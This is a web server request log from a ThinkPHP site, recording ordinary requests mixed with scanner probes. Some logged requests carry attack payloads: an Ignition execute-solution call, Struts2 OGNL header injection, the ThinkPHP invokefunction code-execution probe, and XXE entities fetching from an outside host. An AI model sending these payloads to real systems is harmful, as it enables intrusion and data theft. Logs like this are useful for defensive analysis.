+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/hnqt.0898yzzx.com/application/admin/controller/Login.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ VIEW ] /www/wwwroot/hnqt.0898yzzx.com/tpl/admin/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T10:24:36+08:00 ] 112.60.22.39 GET jpgy.0898yzzx.com/captcha.html
+[运行时间：0.015952s] [吞吐率：62.69req/s] [内存消耗：1,773.02kb] [文件加载：99]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'method',
+  'method' => 
+  array (
+    0 => '\\think\\captcha\\CaptchaController',
+    1 => 'index',
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'x-from-cdn' => 'xinan',
+  'accept' => '*/*',
+  'host' => 'jpgy.0898yzzx.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'id' => NULL,
+)
+[ info ] [ RUN ] think\captcha\CaptchaController->index[ /www/wwwroot/hnqt.0898yzzx.com/vendor/topthink/think-captcha/src/CaptchaController.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T10:41:36+08:00 ] 192.241.220.240 GET 62.234.118.118/
+[运行时间：0.016331s] [吞吐率：61.23req/s] [内存消耗：2,094.80kb] [文件加载：111]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
+  'host' => '62.234.118.118',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T14:56:58+08:00 ] 221.2.163.231 GET 62.234.118.118/
+[运行时间：0.016783s] [吞吐率：59.58req/s] [内存消耗：2,094.74kb] [文件加载：111]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0',
+  'host' => '62.234.118.118',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T15:05:35+08:00 ] 46.101.107.107 POST 62.234.118.118:443/_ignition/execute-solution
+[运行时间：0.012246s] [吞吐率：81.66req/s] [内存消耗：1,777.70kb] [文件加载：100]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '_ignition',
+    1 => 'execute-solution',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'content-type' => 'application/json',
+  'connection' => 'close',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept' => '*/*',
+  'content-length' => '155',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'host' => '62.234.118.118:443',
+)
+[ info ] [ PARAM ] array (
+  'solution' => 'Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution',
+  'parameters' => 
+  array (
+    'variableName' => 'username',
+    'viewFile' => '',
+  ),
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T15:05:37+08:00 ] 46.101.107.107 GET 62.234.118.118:443/
+[运行时间：0.014315s] [吞吐率：69.86req/s] [内存消耗：2,098.13kb] [文件加载：111]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'content-type' => '%{#context[\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'].addHeader(\'j227a3g2\',\'1\')}.multipart/form-data',
+  'connection' => 'close',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'host' => '62.234.118.118:443',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T15:05:38+08:00 ] 46.101.107.107 GET 62.234.118.118:443/admin/login/index.html
+[运行时间：0.019566s] [吞吐率：51.11req/s] [内存消耗：2,992.15kb] [文件加载：116]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'referer' => 'https://62.234.118.118:443/',
+  'cookie' => 'PHPSESSID=8pnai7dmmmevroeedk8omloa1a',
+  'content-type' => '%{#context[\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'].addHeader(\'j227a3g2\',\'1\')}.multipart/form-data',
+  'connection' => 'close',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'host' => '62.234.118.118:443',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/hnqt.0898yzzx.com/application/admin/controller/Login.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ VIEW ] /www/wwwroot/hnqt.0898yzzx.com/tpl/admin/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T15:05:40+08:00 ] 46.101.107.107 GET 62.234.118.118:443/script
+[运行时间：0.014244s] [吞吐率：70.21req/s] [内存消耗：1,776.26kb] [文件加载：100]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'script',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'host' => '62.234.118.118:443',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T15:05:41+08:00 ] 46.101.107.107 GET 62.234.118.118:443/login
+[运行时间：0.015287s] [吞吐率：65.42req/s] [内存消耗：1,776.24kb] [文件加载：100]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'login',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'host' => '62.234.118.118:443',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T15:05:43+08:00 ] 46.101.107.107 GET 62.234.118.118:443/jenkins/login
+[运行时间：0.012558s] [吞吐率：79.63req/s] [内存消耗：1,776.34kb] [文件加载：100]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'jenkins',
+    1 => 'login',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'host' => '62.234.118.118:443',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T15:05:44+08:00 ] 46.101.107.107 GET 62.234.118.118:443/manager/html
+[运行时间：0.012481s] [吞吐率：80.12req/s] [内存消耗：1,777.23kb] [文件加载：100]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'manager',
+    1 => 'html',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+  'authorization' => 'Basic OGhZVFNVRms6OGhZVFNVRms=',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'host' => '62.234.118.118:443',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T15:05:45+08:00 ] 46.101.107.107 GET 62.234.118.118:443/?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=j227a3g2
+[运行时间：0.015038s] [吞吐率：66.50req/s] [内存消耗：1,777.37kb] [文件加载：100]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Index',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'host' => '62.234.118.118:443',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'j227a3g2',
+    ),
+  ),
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T17:25:13+08:00 ] 192.241.219.87 GET 62.234.118.118/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application
+[运行时间：0.015882s] [吞吐率：62.97req/s] [内存消耗：1,773.24kb] [文件加载：100]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'ecp',
+    1 => 'Current',
+    2 => 'exporttool',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
+  'host' => '62.234.118.118',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T17:27:34+08:00 ] 192.241.219.213 GET 62.234.118.118/owa/auth/logon.aspx
+[运行时间：0.012143s] [吞吐率：82.35req/s] [内存消耗：1,772.99kb] [文件加载：100]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'owa',
+    1 => 'auth',
+    2 => 'logon.aspx',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
+  'host' => '62.234.118.118',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T17:46:27+08:00 ] 106.55.200.91 GET hnqt.0898yzzx.com/client/notify/wxpay_goods
+[运行时间：0.014919s] [吞吐率：67.03req/s] [内存消耗：2,018.48kb] [文件加载：108]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'client',
+    1 => 'notify',
+    2 => 'wxpay_goods',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'referer' => 'https://hnqt.0898yzzx.com/',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 TST(Tencent_Security_Team) a03f',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'x-scanner-uuid' => '1657446387-4231989823',
+  'tencent-leakscan' => 'TST(Tencent Security Team)',
+  'cookie' => 'Tencent_security_check',
+  'host' => 'hnqt.0898yzzx.com',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\client\controller\Notify->wxpay_goods[ /www/wwwroot/hnqt.0898yzzx.com/application/client/controller/Notify.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T17:52:02+08:00 ] 106.55.200.91 GET hnqt.0898yzzx.com/client/notify/wxpay_goods
+[运行时间：0.013642s] [吞吐率：73.30req/s] [内存消耗：2,018.89kb] [文件加载：108]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'client',
+    1 => 'notify',
+    2 => 'wxpay_goods',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'referer' => 'https://pay.weixin.qq.com/wiki/doc/api/micropay.php?chapter=23_5&index=3',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 TST(Tencent_Security_Team) 13ed',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'x-scanner-uuid' => '1657446721-3039784232',
+  'tencent-leakscan' => 'TST(Tencent Security Team)',
+  'cookie' => 'Tencent_security_check',
+  'host' => 'hnqt.0898yzzx.com',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\client\controller\Notify->wxpay_goods[ /www/wwwroot/hnqt.0898yzzx.com/application/client/controller/Notify.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T17:52:03+08:00 ] 106.55.200.91 GET hnqt.0898yzzx.com/client/notify/wxpay_goods
+[运行时间：0.013707s] [吞吐率：72.96req/s] [内存消耗：2,018.89kb] [文件加载：108]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'client',
+    1 => 'notify',
+    2 => 'wxpay_goods',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'referer' => 'https://pay.weixin.qq.com/wiki/doc/api/micropay.php?chapter=23_5&index=3',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 TST(Tencent_Security_Team) 13ed',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'x-scanner-uuid' => '1657446723-2382711430',
+  'tencent-leakscan' => 'TST(Tencent Security Team)',
+  'cookie' => 'Tencent_security_check',
+  'host' => 'hnqt.0898yzzx.com',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\client\controller\Notify->wxpay_goods[ /www/wwwroot/hnqt.0898yzzx.com/application/client/controller/Notify.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T17:52:04+08:00 ] 106.55.200.91 GET hnqt.0898yzzx.com/client/notify/wxpay_goods
+[运行时间：0.013469s] [吞吐率：74.24req/s] [内存消耗：2,018.89kb] [文件加载：108]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'client',
+    1 => 'notify',
+    2 => 'wxpay_goods',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'referer' => 'https://pay.weixin.qq.com/wiki/doc/api/micropay.php?chapter=23_5&index=3',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 TST(Tencent_Security_Team) 13ed',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'x-scanner-uuid' => '1657446724-3740152227',
+  'tencent-leakscan' => 'TST(Tencent Security Team)',
+  'cookie' => 'Tencent_security_check',
+  'host' => 'hnqt.0898yzzx.com',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\client\controller\Notify->wxpay_goods[ /www/wwwroot/hnqt.0898yzzx.com/application/client/controller/Notify.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T17:52:05+08:00 ] 106.55.200.91 GET hnqt.0898yzzx.com/client/notify/wxpay_goods
+[运行时间：0.023150s] [吞吐率：43.20req/s] [内存消耗：2,018.89kb] [文件加载：108]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'client',
+    1 => 'notify',
+    2 => 'wxpay_goods',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'referer' => 'https://pay.weixin.qq.com/wiki/doc/api/micropay.php?chapter=23_5&index=3',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 TST(Tencent_Security_Team) 13ed',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'x-scanner-uuid' => '1657446725-3279626868',
+  'tencent-leakscan' => 'TST(Tencent Security Team)',
+  'cookie' => 'Tencent_security_check',
+  'host' => 'hnqt.0898yzzx.com',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\client\controller\Notify->wxpay_goods[ /www/wwwroot/hnqt.0898yzzx.com/application/client/controller/Notify.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T17:52:06+08:00 ] 106.55.200.91 GET hnqt.0898yzzx.com/client/notify/wxpay_goods
+[运行时间：0.013322s] [吞吐率：75.06req/s] [内存消耗：2,018.89kb] [文件加载：108]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'client',
+    1 => 'notify',
+    2 => 'wxpay_goods',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'referer' => 'https://pay.weixin.qq.com/wiki/doc/api/micropay.php?chapter=23_5&index=3',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 TST(Tencent_Security_Team) 13ed',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'x-scanner-uuid' => '1657446726-3854833165',
+  'tencent-leakscan' => 'TST(Tencent Security Team)',
+  'cookie' => 'Tencent_security_check',
+  'host' => 'hnqt.0898yzzx.com',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\client\controller\Notify->wxpay_goods[ /www/wwwroot/hnqt.0898yzzx.com/application/client/controller/Notify.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T17:52:07+08:00 ] 106.55.200.91 POST hnqt.0898yzzx.com/client/notify/wxpay_goods
+[运行时间：0.013513s] [吞吐率：74.00req/s] [内存消耗：2,019.60kb] [文件加载：108]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'client',
+    1 => 'notify',
+    2 => 'wxpay_goods',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 TST(Tencent_Security_Team)',
+  'x-scanner-uuid' => '1657446727-1801827740',
+  'tencent-leakscan' => 'TST(Tencent Security Team)',
+  'content-length' => '158',
+  'referer' => 'https://pay.weixin.qq.com/wiki/doc/api/micropay.php?chapter=23_5&index=3',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'cookie' => 'Tencent_security_check',
+  'host' => 'hnqt.0898yzzx.com',
+)
+[ info ] [ PARAM ] array (
+  '<?xml_version' => '"1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "http://tst2.qq.com/xxe_inject/c2753c7061da4e04727eaf4fefebd94f">
+%xxe;  
+]>',
+)
+[ info ] [ RUN ] app\client\controller\Notify->wxpay_goods[ /www/wwwroot/hnqt.0898yzzx.com/application/client/controller/Notify.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T17:52:07+08:00 ] 106.55.200.91 POST hnqt.0898yzzx.com/client/notify/wxpay_goods
+[运行时间：0.015163s] [吞吐率：65.95req/s] [内存消耗：2,020.46kb] [文件加载：108]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'client',
+    1 => 'notify',
+    2 => 'wxpay_goods',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 TST(Tencent_Security_Team)',
+  'x-scanner-uuid' => '1657446727-4147700549',
+  'tencent-leakscan' => 'TST(Tencent Security Team)',
+  'content-length' => '178',
+  'referer' => 'https://pay.weixin.qq.com/wiki/doc/api/micropay.php?chapter=23_5&index=3',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'cookie' => 'Tencent_security_check',
+  'host' => 'hnqt.0898yzzx.com',
+)
+[ info ] [ PARAM ] array (
+  '<?xml_version' => '"1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+	<!ENTITY xxe SYSTEM "http://tst2.qq.com/xxe_inject/e4012b4b11ba6fb1bd274b947332f286">]>
+<foo><value>',
+  'xxe;</value></foo>' => '',
+)
+[ info ] [ RUN ] app\client\controller\Notify->wxpay_goods[ /www/wwwroot/hnqt.0898yzzx.com/application/client/controller/Notify.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T17:52:07+08:00 ] 106.55.200.91 POST hnqt.0898yzzx.com/client/notify/wxpay_goods
+[运行时间：0.014380s] [吞吐率：69.54req/s] [内存消耗：2,019.60kb] [文件加载：108]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'client',
+    1 => 'notify',
+    2 => 'wxpay_goods',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 TST(Tencent_Security_Team)',
+  'x-scanner-uuid' => '1657446727-2670540907',
+  'tencent-leakscan' => 'TST(Tencent Security Team)',
+  'content-length' => '153',
+  'referer' => 'https://pay.weixin.qq.com/wiki/doc/api/micropay.php?chapter=23_5&index=3',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'cookie' => 'Tencent_security_check',
+  'host' => 'hnqt.0898yzzx.com',
+)
+[ info ] [ PARAM ] array (
+  '<?xml_version' => '"1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "http://tst2.qq.com/T_S_T/807faf38909024fa5fda9cfafb97379f">
+%xxe;  
+]>',
+)
+[ info ] [ RUN ] app\client\controller\Notify->wxpay_goods[ /www/wwwroot/hnqt.0898yzzx.com/application/client/controller/Notify.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T17:57:56+08:00 ] 154.89.5.126 GET 62.234.118.118:443/
+[运行时间：0.014740s] [吞吐率：67.84req/s] [内存消耗：2,094.30kb] [文件加载：111]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '62.234.118.118:443',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T19:39:18+08:00 ] 167.71.182.47 GET hnqt.0898yzzx.com/
+[运行时间：0.014465s] [吞吐率：69.13req/s] [内存消耗：2,094.66kb] [文件加载：111]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)',
+  'host' => 'hnqt.0898yzzx.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T19:39:20+08:00 ] 62.234.118.118 GET hnqt.0898yzzx.com/
